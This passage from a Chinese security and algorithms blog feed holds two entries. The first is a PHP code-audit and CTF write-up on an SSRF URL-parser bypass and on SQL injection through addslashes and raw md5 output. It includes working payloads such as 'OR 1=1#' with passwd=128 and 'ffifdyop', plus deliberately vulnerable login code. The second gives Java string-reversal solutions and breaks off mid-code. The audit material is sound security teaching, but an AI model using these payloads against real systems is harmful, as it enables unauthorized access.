函数对URL的合法性进行判断。而在 safe_request_url 函数中，使用 check_inner_ip 函数判断用户请求的IP是否为内部IP地址，如果是，则拒绝该请求；否则使用curl进行请求，并将请求结果进行输出。对于这一知识点，我们可以参考这篇文章： us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages<br><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-8.png"><br>我们可以利用URL解析器之间的差异处理，构造如下 payload ：<br><code>curl -d &quot;url=http://foo@localhost:80@www.freebuf.com/flag.php&quot; &quot;http://题目IP/&quot;</code><br><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-9.png"></p><h2 id="Day-17-Turkey-Baster"><a href="#Day-17-Turkey-Baster" class="headerlink" title="Day 17 - Turkey Baster"></a>Day 17 - Turkey Baster</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$em</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;em = <span class="title class_">DoctrineManager</span>::<span class="title function_ invoke__">getEntityManager</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$queryBuilder</span> = <span class="variable language_">$this</span>-&gt;em-&gt;<span class="title function_ invoke__">createQueryBuilder</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">select</span>(<span class="string">&quot;COUNT(p)&quot;</span>)</span><br><span class="line">            -&gt;<span class="keyword">from</span>(<span class="string">&quot;User&quot;</span>, <span class="string">&quot;u&quot;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;password=&#x27;<span class="subst">$pass</span>&#x27; AND user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$queryBuilder</span>-&gt;<span class="title function_ invoke__">getQuery</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">boolval</span>(<span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getSingleScalarResult</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">RealSecureLoginManager</span>(</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>这题实际上和我们之前分析 <strong>Day13</strong> 很相似，从 <strong>第17行-20行</strong> 代码中明显存在SQL语句拼接的形式，而 <strong>$pass</strong> 变量和 <strong>$user</strong> 变量是在 <strong>第30行和31行</strong> 中通过 <strong>POST</strong> 方式由用户进行控制。这里很明显存在SQL注入漏洞，所以这题应该是考察SQL注入漏洞。</p><p>这里为什么说这题和 <strong>Day13</strong> 很相似呢，我们继续往下看。程序代码 <strong>第14行</strong> 调用 <strong>sanitizeInput</strong> 函数针对用户输入的 <strong>$user</strong> 变量进行了处理，跟进一下 <strong>sanitizeInput</strong> 函数，在 <strong>第25行</strong> 找到这个函数，这个函数的作用就是调用 <strong>addslashes</strong> 函数针对输入数据进行处理。 <strong>addslashes</strong> 函数定义如下：</p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">addslashes</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure><p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NUL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p></blockquote><p>所以按照这种情况下这个地方，似乎不存在注入点了，先别急，我们继续往下看，我们看到 <strong>第13行</strong> 代码针对用户输入 <strong>password</strong> 的值调用 <strong>md5</strong> 函数进行相关处理。我们先来了解一下这个 <strong>md5</strong> 函数</p><blockquote><p><a href="http://php.net/manual/zh/function.md5.php">md5</a> — 计算字符串的 MD5 散列值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">md5</span> ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure></blockquote><p>我们看到题目中的代码是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>这里在 <strong>$raw_output</strong> 位置设置为了true，根据描述</p><blockquote><p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p></blockquote><p>那我们先来看看效果</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-10.png"></p><p>现在整理一下这道题，我们知道我可以控制的点有两个变量，一个是 <strong>$user</strong> ，一个是 <strong>$pass</strong> ，**$pass** 经过了 <strong>md5</strong> 的处理，但是返回字段不是标准的md5值，**$user** 经过了 <strong>addslashes</strong> 函数的处理，无法引入特殊符号去闭合。这里做个假设，如果我们经过 <strong>$pass &#x3D; md5($this-&gt;password, true);</strong> 处理之后的值逃逸出一个反斜杆，那么实际上带入到数据库的值就如下所示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> s <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;xxxxxx\&#x27;</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;xxx#&#x27;</span></span><br></pre></td></tr></table></figure><p>如果这种情况发生，实际上也存在了SQL注入。我们尝试fuzz一下，看看会不会存在某个值经过了 <strong>md5(xxx, true)</strong> 处理之后，最后一位是反斜杠。</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-11.png"></p><p>我们针对1-1000进行一下fuzz，发现 <strong>md5(128, true)</strong> 最后的结果带有反斜杠。因此这题最后的payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR 1=1#&amp;passwd=128</span><br></pre></td></tr></table></figure><p>带入到数据库查询的语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> s <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;v�an���l���q��\&#x27;</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27; OR 1=1#&#x27;</span></span><br></pre></td></tr></table></figure><p>最后我们之前 <strong>Day13</strong> 也是通过逃逸反斜杆，转义单引号，从而逃逸出一个单引号闭合了之前的SQL语句，之前 <strong>Day13</strong> 的payload如下所示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;1234567890123456789\&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure><p>这里也是因为SQL语句中有两个地方可控，因此，我们也可以通过这个办法造成SQL注入的问题，所以我才会说这道题实际上和 <strong>Day13</strong> 很相似。</p><h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>由于找不到由 <strong>md5(xxx,true)</strong> 函数引起的漏洞实例，所以本次实例分析选择实验吧的一道CTF题目，进行分析，<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php">题目地址</a>。<br>首先打开该题目提示后台登陆，猜测可能是个注入的题目，先看看有没有相关信息泄漏，右键源代码，发现泄漏的登陆逻辑代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag is :&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;密码错误!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上图中的代码中的 <strong>第5行</strong> 可以看到，当查询结果返回大于0的时候，就会输出 <strong>flag</strong> ，我们前面分析过当 <strong>md5</strong> 函数的 <strong>$raw_output</strong> 设置会true的时候， <strong>md5</strong> 函数返回前16字节长度的原始二进制，然后再将二进制转换成字符串，这种情况下可能会引入单引号等特殊字符。</p><p>有人尝试过破解这个类型的字符，目前已知两个是 <strong>ffifdyop</strong> 和<strong>129581926211651571912466741651878684928</strong> ，我们来看看实际效果。</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-12.png"></p><p>所以实际上这里就会导致了SQL注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;md5($password,true)&#x27;</span></span><br><span class="line">变成：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6\xc9]\x99&#x27;</span></span><br></pre></td></tr></table></figure><p>由于 <strong>and</strong> 运算符优先级比 <strong>or</strong> 高，所以前面的：<strong>username &#x3D; ‘admin’ and password &#x3D; ‘’</strong> 会先执行，然后将执行结果与后面的 <strong>‘6\xc9]\x99’</strong> 进行 <strong>or</strong> 运算。在布尔运算中，除了 <strong>0、’0’、false、null</strong> ，其余结果都为真。所以整个 <strong>SQL</strong> 语句的 <strong>where</strong> 条件判断部分为真，这样可定就能查出数据，类似如下：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-13.png"></p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议在使用 <strong>md5</strong> 函数的时候，不要将 <strong>$raw_output</strong> 字段设置为<strong>true</strong> 。</p><p><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】字符串</title>
      <link href="/2024/10/16/algorithm/string/"/>
      <url>/2024/10/16/algorithm/string/</url>
      
        <content type="html"><![CDATA[<h2 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344.反转字符串"></a>344.反转字符串</h2><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 s 的形式给出。<br>不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。</p><p>示例 1：<br>输入：s &#x3D; [“h”,”e”,”l”,”l”,”o”]<br>输出：[“o”,”l”,”l”,”e”,”h”]</p><p>示例 2：<br>输入：s &#x3D; [“H”,”a”,”n”,”n”,”a”,”h”]<br>输出：[“h”,”a”,”n”,”n”,”a”,”H”]</p><p>使用双指针解决这个问题,同时可以用异或来交换数值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            s[l] ^= s[r];</span><br><span class="line">            s[r] ^= s[l];</span><br><span class="line">            s[l] ^= s[r];</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="541-反转字符串II"><a href="#541-反转字符串II" class="headerlink" title="541. 反转字符串II"></a>541. 反转字符串II</h2><p>给定一个字符串 s 和一个整数 k，从字符串开头算起, 每计数至 2k 个字符，就反转这 2k 个字符中的前 k 个字符。<br>如果剩余字符少于 k 个，则将剩余字符全部反转。</p><p>如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。</p><p>示例:<br>输入: s &#x3D; “abcdefg”, k &#x3D; 2<br>输出: “bacdfeg”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; length)&#123;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="comment">// 与length进行判断,,如果大了就将其置为length</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">firstK</span> <span class="operator">=</span> (start + k &gt; length) ? length : start + k;</span><br><span class="line">            <span class="type">int</span> <span class="variable">secondK</span> <span class="operator">=</span> (start + (<span class="number">2</span>*k) &gt; length) ? length : start + (<span class="number">2</span>*k);</span><br><span class="line">            <span class="comment">// 无论start的位置,至少会反转一次</span></span><br><span class="line">            temp.append(s.substring(start, firstK));</span><br><span class="line">            res.append(temp.reverse());</span><br><span class="line">            <span class="comment">// 如果firstK到secondK之间有元素,这些元素直接放入res里</span></span><br><span class="line">            <span class="keyword">if</span>(firstK &lt; secondK)&#123;</span><br><span class="line">                res.append(s.substring(firstK, secondK));</span><br><span class="line">            &#125;</span><br><span class="line">            start += (<span class="number">2</span>*k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 每隔2k个反转前k个</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] ch = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ch.length; i+=<span class="number">2</span>*k)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(ch.length-<span class="number">1</span>,start+k-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span>(start &lt; end)&#123;</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                ch[end] ^= ch[start];</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                start++;</span><br><span class="line">                end--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="替换数字"><a href="#替换数字" class="headerlink" title="替换数字"></a>替换数字</h2><p>给定一个字符串 s，它包含小写字母和数字字符，请编写一个函数，将字符串中的字母字符保持不变，而将每个数字字符替换为number。<br>例如，对于输入字符串 “a1b2c3”，函数应该将其转换为 “anumberbnumbercnumber”。<br>对于输入字符串 “a5b”，函数应该将其转换为 “anumberb”<br>输入：一个字符串 s,s 仅包含小写字母和数字字符。<br>输出：打印一个新的字符串，其中每个数字字符都被替换为了number<br>样例输入：a1b2c3<br>样例输出：anumberbnumbercnumber<br>数据范围：1 &lt;&#x3D; s.length &lt; 10000</p><p>如果想把这道题目做到极致，就不要只用额外的辅助空间了！ （不过使用Java刷题的录友，一定要使用辅助空间，因为Java里的string不能修改）<br>首先扩充数组到每个数字字符替换成 “number” 之后的大小。<br>例如 字符串 “a5b” 的长度为3，那么 将 数字字符变成字符串 “number” 之后的字符串为 “anumberb” 长度为 8。<br><img src="/2024/10/16/algorithm/string/image.png"><br>然后从后向前替换数字字符，也就是双指针法，过程如下：i指向新长度的末尾，j指向旧长度的末尾。<br><img src="/2024/10/16/algorithm/string/image-1.png"><br>有同学问了，为什么要从后向前填充，从前向后填充不行么？<br>从前向后填充就是O(n^2)的算法了，因为每次添加元素都要将添加元素之后的所有元素整体向后移动。<br>其实很多数组填充类的问题，其做法都是先预先给数组扩容带填充后的大小，然后在从后向前进行操作。</p><p>这么做有两个好处：</p><ol><li>不用申请新数组。</li><li>从后向前填充元素，避免了从前向后填充元素时，每次添加元素都要将添加元素之后的所有元素向后移动的问题。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">replaceNumber</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 统计数字的个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sOldSize</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.isDigit(s.charAt(i)))&#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 扩充字符串s的大小，也就是每个空格替换成&quot;number&quot;之后的大小</span></span><br><span class="line">        <span class="type">char</span>[] newS = <span class="keyword">new</span> <span class="title class_">char</span>[s.length() + count * <span class="number">5</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sNewSize</span> <span class="operator">=</span> newS.length;</span><br><span class="line">        <span class="comment">// 将旧字符串的内容填入新数组</span></span><br><span class="line">        System.arraycopy(s.toCharArray(), <span class="number">0</span>, newS, <span class="number">0</span>, sOldSize);</span><br><span class="line">        <span class="comment">// 从后先前将空格替换为&quot;number&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sNewSize - <span class="number">1</span>, j = sOldSize - <span class="number">1</span>; j &lt; i; j--, i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Character.isDigit(newS[j])) &#123;</span><br><span class="line">                newS[i] = newS[j];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newS[i] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">2</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">3</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">4</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">5</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">                i -= <span class="number">5</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(newS);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">        System.out.println(replaceNumber(s));</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了还原题目本意，先把原数组复制到扩展长度后的新数组，然后不再使用原数组、原地对新数组进行操作。</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                len += <span class="number">5</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span>[] ret = <span class="keyword">new</span> <span class="title class_">char</span>[len];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            ret[i] = s.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s.length() - <span class="number">1</span>, j = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span 